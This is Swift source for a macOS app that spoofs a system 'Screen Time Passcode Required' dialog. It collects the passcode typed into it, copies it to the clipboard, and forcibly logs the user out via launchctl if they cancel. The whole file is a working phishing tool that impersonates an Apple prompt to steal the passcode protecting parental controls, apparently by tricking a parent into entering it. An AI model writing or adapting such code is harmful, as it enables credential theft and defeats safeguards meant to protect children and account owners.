import Cocoa
import SwiftUI

@main
struct ScreenTimePasscodeApp: App {
    @NSApplicationDelegateAdaptor(AppDelegate.self) var appDelegate

    var body: some Scene {
        Settings { }
    }
}

class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(_ notification: Notification) {
        // Create and configure a modal dialog popup
        let alert = NSAlert()
        alert.messageText = "Screen Time Passcode Required"
        alert.informativeText = "To continue using Screen Time and Parental Control on this Mac you are required to enter the Screen Time Passcode. If you are a child, get your parents to help you with this action."
        alert.alertStyle = .warning

        // Add a text field for entering the passcode
        let inputTextField = NSSecureTextField(frame: NSRect(x: 0, y: 0, width: 200, height: 24))
        alert.accessoryView = inputTextField

        // Add buttons
        alert.addButton(withTitle: "Continue")
        alert.addButton(withTitle: "Cancel")

        // Configure modal behavior
        var response: NSApplication.ModalResponse
        repeat {
            response = alert.runModal()
            if response == .alertFirstButtonReturn {
                // "Continue" was clicked, validate passcode length
                let passcode = inputTextField.stringValue
                if passcode.count >= 4 {
                    // Valid passcode, copy it to the clipboard
                    copyToClipboard(passcode)
                    break
                } else {
                    // Show an error alert if the passcode is less than 4 characters
                    let errorAlert = NSAlert()
                    errorAlert.messageText = "Invalid Passcode"
                    errorAlert.informativeText = "Please make sure you entered the correct password."
                    errorAlert.alertStyle = .critical
                    errorAlert.runModal()
                }
            } else {
                // "Cancel" was clicked, log out the user
                logOutCurrentUser()
                break
            }
        } while true
    }

    private func logOutCurrentUser() {
        let task = Process()
        task.launchPath = "/bin/launchctl"
        task.arguments = ["bootout", "gui/\(getuid())"]
        task.launch()
    }

    private func copyToClipboard(_ text: String) {
        let pasteboard = NSPasteboard.general
        pasteboard.clearContents()
        pasteboard.setString(text, forType: .string)
    }
}
